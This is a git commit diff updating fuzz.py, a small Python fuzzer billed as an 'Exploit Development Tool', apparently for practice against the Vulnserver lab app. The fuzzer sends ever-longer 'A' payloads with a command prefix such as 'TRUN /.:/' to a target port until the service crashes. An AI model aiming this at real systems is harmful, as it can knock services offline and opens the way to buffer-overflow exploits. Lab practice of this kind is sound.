fc5a1098073d105092d3d203c0b1f97279066942
rootshooter <75587096+rootshooter@users.noreply.github.com>
2020-12-11 06:35:21 +0000

    Update fuzz.py

--- fuzz.py
+++ fuzz.py
@@ -1,26 +1,26 @@
 #!/usr/bin/python
-import optparse, os, sys, socket, time
+import optparse, sys, socket, time
 
-parser = optparse.OptionParser('Example: python fuzz.py -t <target host> -p <target port>')
+parser = optparse.OptionParser('Example: python fuzz.py -t <target host> -p <target port> -c <command>')
 parser.add_option('-t', dest='target', type='string', help='Enter a target host')
 parser.add_option('-p', dest='port', type='int', help='Enter a target port')
+parser.add_option('-c', dest='command', type='string', help='Enter a command')
 (options, args) = parser.parse_args()
-target = options.target
-port = options.port
+target = options.target #IP Address
+port = options.port #Port Number
+command = options.command # "COMMAND "
 
 if (target == None) | (port == None):
 	print(parser.usage)
 	exit(0)
 
 print('\n------------------------------------FUZZ----------------------------------------')
-print('                            Exploit Development Tool')
-print('                             Author: @rootshooter')
-print('                                Version: 1.0')
+print('                              Author: @rootshooter')
+print('                                 Version: 1.0')
 print('--------------------------------------------------------------------------------')
-print('[+] Let the FUZZing begin!......\n')
+
 
 payload = "A" * 100 #CHANGE AS NEEDED
-command = "TRUN /.:/" #CHANGE AS NEEDED
 
 while True :
 	try:
@@ -28,12 +28,13 @@ while True :
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((target , port))
 		s.send((command + payload))
+		s.recv(1024)
 		s.close()
 		time.sleep(1)
 		payload = payload + "A" * 100
 
 	except:
-		print('[+] Crash detected at %s bytes!' % str(len(payload)))
+		print('[+] Crash detected at %s bytes!\n' % str(len(payload)))
 		sys.exit()
 
 
